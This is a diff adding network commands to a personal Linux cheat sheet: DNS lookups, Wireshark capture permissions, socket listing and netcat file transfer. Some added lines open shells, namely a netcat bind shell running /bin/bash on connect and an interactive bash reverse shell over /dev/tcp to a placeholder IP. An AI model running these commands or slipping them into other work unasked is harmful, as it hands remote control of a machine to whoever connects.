@@ -90,9 +90,11 @@
 
 # network
 
-    # ip information
-    traceroute www.google.com
-    whois www.google.com | less
+    whois google.com
+    dig +short google.com
+    nslookup google.com
+
+    tracepath <desitination>
 
     # network statistics
     Network statistics of upload & download rates
@@ -101,6 +103,40 @@
     # mount ssh directory
     sshfs roger@ipaddr:/home/toto /mnt/roger/
     fusermount -u mountpoint # unmount
+
+    # wsharks: capture as non-root
+    sudo usermod -a -G wireshark <username>
+    sudo chmod 750 /usr/bin/dumpcap
+    sudo setcap cap_net_raw,cap_net_admin+eip /usr/bin/dumpcap
+    # logout
+
+    # investigate sockets: all, numeric(noresolve), tcp, listen, processes
+    ss -antlp
+
+    # create file on target
+    nc -vlpn 6666 > mybin
+    
+    # execute on target on connect
+    nc -vlpn 6666 -e /bin/bash
+    
+    # send from source
+    nc -vn <ip> 6666 < mybin
+
+    # native /dev/tcp way
+    { cat /tmp/toto >&3; cat <&3; } 3<>/dev/tcp/0.0.0.0/42070
+
+    # http get with netcat
+    cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv
+
+    # http get with native /dev/tcp way
+    { printf >&3 'GET / HTTP/1.0\r\n\r\n'; cat <&3 } 3<>/dev/tcp/www.google.com/80
+
+    # reverse shell listen
+    nc -v -l -p 6666
+
+    # reverse shell interactive bash on tcp:
+    # >& (send bash output); 0>&1 (resend stdin to stdout); & (background)
+    /bin/bash -i >& /dev/tcp/<ip>/6666 0>&1 &
 
 # multimedia
 
